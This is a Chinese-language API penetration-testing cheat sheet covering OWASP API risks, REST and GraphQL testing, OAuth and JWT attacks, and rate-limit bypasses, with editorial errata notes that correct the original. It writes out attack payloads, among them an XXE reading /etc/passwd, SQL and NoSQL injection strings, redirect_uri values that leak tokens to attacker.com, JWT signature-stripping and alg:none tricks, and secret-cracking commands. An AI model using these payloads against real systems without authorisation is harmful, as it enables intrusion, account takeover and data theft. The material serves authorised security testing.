# 🔌 API 安全测试速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██████╗ ██╗    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
  ██╔══██╗██╔══██╗██║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
  ███████║██████╔╝██║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
  ██╔══██║██╔═══╝ ██║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
  ██║  ██║██║     ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
  ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
```

<p align="center">
  <img src="https://img.shields.io/badge/API-Security-blue?style=for-the-badge" alt="API">
  <img src="https://img.shields.io/badge/REST-Testing-green?style=for-the-badge" alt="REST">
  <img src="https://img.shields.io/badge/GraphQL-red?style=for-the-badge" alt="GraphQL">
</p>

---

## 📋 目录

- [OWASP API Top 10](#-owasp-api-top-10)
- [REST API 测试](#-rest-api-testing)
- [GraphQL 测试](#-graphql-testing)
- [身份认证攻击](#-authentication-attacks)
- [JWT 攻击](#-jwt-attacks)
- [常见漏洞](#-common-vulnerabilities)

---

<a id="-owasp-api-top-10"></a>
## 🔴 OWASP API Top 10

> **版本勘误：** 下表保留原文顺序与编号。[OWASP API Security Top 10 2023](https://api-security.owasp.org/editions/2023/en/0x11-t10/)的第 `6` 项应为“对敏感业务流程的访问不受限制”，第 `7` 项为 SSRF，第 `8` 项为安全配置错误；第 `9` 项的正式名称为“资产清单管理不当”。资源消耗风险也不限于缺少速率限制。

| # | 漏洞 | 说明 |
|---|---------------|-------------|
| 1 | **BOLA** | 对象级授权失效 |
| 2 | **身份认证失效** | 身份认证机制存在缺陷 |
| 3 | **BOPLA** | 对象属性级授权失效 |
| 4 | **资源消耗不受限制** | 缺少速率限制 |
| 5 | **BFLA** | 功能级授权失效 |
| 6 | **SSRF** | 服务端请求伪造 |
| 7 | **安全配置错误** | 使用默认配置 |
| 8 | **缺少保护机制** | 业务流程 |
| 9 | **资产管理不当** | 旧版 API |
| 10 | **不安全地使用外部 API** | 第三方接口 |

---

<a id="-rest-api-testing"></a>
## 🌐 REST API 测试

### 发现与枚举

```bash
# 查找 API 端点
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# 版本枚举
/api/v1/users
/api/v2/users
/api/v3/users
/api/beta/users
/api/latest/users

# 常见路径
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger/
/openapi.json
/api-docs
/swagger.json
/swagger-ui/
/docs/
```

### HTTP 方法测试

```bash
# 测试各种 HTTP 方法
curl -X GET https://api.target.com/users/1
curl -X POST https://api.target.com/users
curl -X PUT https://api.target.com/users/1
curl -X PATCH https://api.target.com/users/1
curl -X DELETE https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users

# 请求方法覆盖
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.target.com/users/1
curl -X POST -H "X-Method-Override: PUT" https://api.target.com/users/1
```

### 参数篡改

```bash
# BOLA/IDOR（对象级授权失效／不安全的直接对象引用）
GET /api/users/1      # 你的 ID
GET /api/users/2      # 其他用户的 ID
GET /api/users/0
GET /api/users/-1
GET /api/users/999999

# 参数污染
/api/users?id=1&id=2
/api/users?id[]=1&id[]=2

# 尝试通过编码绕过限制
/api/users/1%00
/api/users/1%0a
/api/users/1%2e%2e%2f2
```

### Content-Type 攻击

```bash
# 更改 Content-Type
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: text/plain

# 通过 Content-Type 测试 XXE（XML 外部实体注入）
curl -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
```

### 批量赋值（Mass Assignment）

> **示例格式说明：** 上方 XXE 的 curl 示例没有目标 URL；下方带 `#` 注释的请求体是便于讲解的伪 JSON，并非可直接提交的标准 JSON。本文保留这些原文示例。

```bash
# 添加额外字段
POST /api/users
{
  "username": "test",
  "email": "test@test.com",
  "role": "admin",           # 尝试添加
  "isAdmin": true,           # 尝试添加
  "balance": 99999,          # 尝试添加
  "verified": true           # 尝试添加
}

# 使用数组
{
  "user": {
    "name": "test",
    "role_ids": [1, 2, 3]
  }
}
```

---

<a id="-graphql-testing"></a>
## 📊 GraphQL 测试

### 内省（Introspection）

```graphql
# 完整内省查询（原文称呼，此处只查询部分元数据）
query {
  __schema {
    types {
      name
      fields {
        name
        args { name }
      }
    }
  }
}

# 简单内省查询
{__schema{types{name,fields{name}}}}

# 获取所有查询字段
{__schema{queryType{fields{name,description}}}}

# 获取所有变更字段（mutation）
{__schema{mutationType{fields{name,description}}}}
```

> **内省说明：** 上方首个查询仅获取部分元数据，并非完整的 schema 导出。`__schema` 和 `__type` 都属于[GraphQL 内省系统](https://graphql.org/learn/introspection/)；改用 `__type` 不保证绕过完整的内省禁用策略。

### 常见攻击

```graphql
# IDOR（不安全的直接对象引用）
query { user(id: 2) { email, password } }

# 批处理攻击（此例使用同一查询内的多个别名）
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}

# 嵌套查询拒绝服务（DoS）
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}

# 字段建议
{ user { a }  # 可能提示有效字段名
```

> **GraphQL 示例说明：** 上方“批处理”示例实际是在单次查询中使用别名；最后的字段建议片段缺少闭合的大括号，且建议是否返回取决于实现。深度嵌套或多个别名是否导致拒绝服务，取决于[查询深度、宽度和成本限制](https://graphql.org/learn/security/)。原文片段均保留。

### GraphQL 中的 SQL 注入

```graphql
# 参数中的 SQL 注入（SQLi）
query { user(name: "' OR '1'='1") { id } }
query { users(filter: "admin'--") { id } }

# NoSQL 注入
query { user(query: "{$gt: ''}") { id } }
```

### 尝试绕过内省禁用限制

```graphql
# 另一种内省查询
query { __type(name: "User") { fields { name } } }

# 使用 ffuf 暴力枚举字段
# 使用常见 GraphQL 字段名字典
```

---

<a id="-authentication-attacks"></a>
## 🔐 身份认证攻击

### API 密钥测试

```bash
# 查找 API 密钥
# 检查 JS 文件、移动应用和 GitHub

# 在不同位置提交密钥进行测试
curl -H "X-API-Key: KEY" https://api.target.com
curl -H "Authorization: Bearer KEY" https://api.target.com
curl -H "api-key: KEY" https://api.target.com
curl "https://api.target.com?api_key=KEY"
```

### OAuth/OAuth2 攻击

```bash
# 通过 redirect_uri 窃取令牌
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com%40attacker.com
?redirect_uri=https://target.com/callback/../../../attacker

# 尝试绕过 state 参数校验
# 移除 state 参数
# 为不同用户使用相同的 state

# 令牌泄露
# 检查 Referer 请求头中是否泄露令牌
```

### 会话管理

```bash
# 令牌枚举
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# 登出后旧令牌是否仍然有效？
# 令牌轮换问题
# 跨会话重用令牌
```

---

<a id="-jwt-attacks"></a>
## 🎫 JWT 攻击

### 解码 JWT

```bash
# 在线工具：jwt.io
# 命令行
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

> **解码勘误：** [RFC 7519](https://www.rfc-editor.org/rfc/rfc7519)规定 JWT 由点号分隔的 Base64url 编码部分组成。上方带 `...` 的字符串并非完整令牌，不能直接用普通 `base64 -d` 解码整个 JWT；对 JWS 而言，应分别解析头部和载荷，解码也不等于验证签名。

### 算法混淆

```bash
# 将 alg 改为 none
{
  "alg": "none",
  "typ": "JWT"
}
# 移除签名

# HS256 → RS256 攻击（原文方向，参见下方勘误）
# 将公钥用作 HMAC 密钥
```

> **算法方向勘误：** 原文的 `HS256 → RS256` 方向写反了。[PortSwigger 对算法混淆的说明](https://portswigger.net/web-security/jwt/algorithm-confusion)描述的是将原本应按 RS256 验证的令牌改为 HS256，使有缺陷的验证端把 RSA 公钥当作 HMAC 密钥。单独更改算法或删除签名不会使安全实现接受令牌。

### 签名验证绕过

```bash
# 移除签名（保留点号）
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.

# 对弱密钥进行字典破解
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# 常见弱密钥
secret
password
123456
your-256-bit-secret
```

> **签名示例说明：** 上方删除签名的令牌头仍声明 HS256，不是 `alg: none` 的完整示例。[RFC 7519](https://www.rfc-editor.org/rfc/rfc7519)中的无签名 JWT 使用 `none` 并具有空签名；应用仍须只接受其允许的算法。修改下方声明后，签名验证正常的服务也会拒绝被篡改的令牌。

### 声明（Claim）篡改

```javascript
// 更改用户声明
{
  "sub": "1234567890",
  "name": "admin",        // 改为 admin
  "role": "admin",        // 提升角色权限
  "admin": true,          // 添加 admin 标记
  "exp": 9999999999       // 延长有效期
}
```

### JWT 工具

```bash
# jwt_tool
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -T    # 篡改
python3 jwt_tool.py <JWT> -C -d wordlist.txt  # 破解

# jwtcrack
./jwtcrack <JWT>
```

---

<a id="-common-vulnerabilities"></a>
## 🐛 常见漏洞

### 绕过速率限制

> **实现差异说明：** [RFC 9110 §5.1](https://www.rfc-editor.org/rfc/rfc9110.html#section-5.1)规定 HTTP 字段名不区分大小写。以下代理相关请求头只有在服务端错误地信任客户端输入时才可能影响限流，单纯改变字段名大小写并不是通用绕过方法。

```bash
# 尝试测试的请求头
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1

# 更改大小写
X-FORWARDED-FOR: 127.0.0.1

# 空字节
X-Forwarded-For: 127.0.0.1%00

# 不同端点
/api/login
/API/LOGIN
/api/Login
/api/login/
```

### BOLA（对象级授权失效）

```bash
# 测试 ID 篡改
GET /api/orders/123    # 你的订单
GET /api/orders/124    # 其他用户的订单

# 猜测 UUID
# 检查是否存在可预测的模式
# 尝试顺序模式或基于时间戳的模式

# 不同格式的 ID
/api/users/1
/api/users/001
/api/users/user_1
/api/users/0x1
```

### BFLA（功能级授权失效）

```bash
# 以普通用户身份访问管理员端点
GET /api/admin/users
POST /api/admin/config
DELETE /api/admin/user/1

# 基于请求方法的权限测试
GET /api/users     # 允许访问
POST /api/users    # 是否应仅允许管理员访问？
DELETE /api/users  # 是否应仅允许管理员访问？
```

### 资产管理不当

```bash
# 旧版 API
/api/v1/users    # 可能存在更多漏洞
/api/v2/users    # 当前版本
/api/v3/users    # 测试版／尚未发布

# 开发用途的端点
/api/debug/
/api/test/
/api/internal/
/api/dev/
```

---

## 🛠️ 工具

| 工具 | 用途 |
|------|---------|
| **Burp Suite** | API 流量拦截与测试 |
| **Postman** | API 探索 |
| **Insomnia** | REST/GraphQL 客户端 |
| **graphql-voyager** | GraphQL 可视化 |
| **jwt_tool** | JWT 测试 |
| **Arjun** | 参数发现 |

---

## 📚 参考资源

- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [JWT.io](https://jwt.io/)

---

<p align="center">
  <b>🔌 保护你的 API！</b><br>
  <i>仅限经授权的测试！</i>
</p>
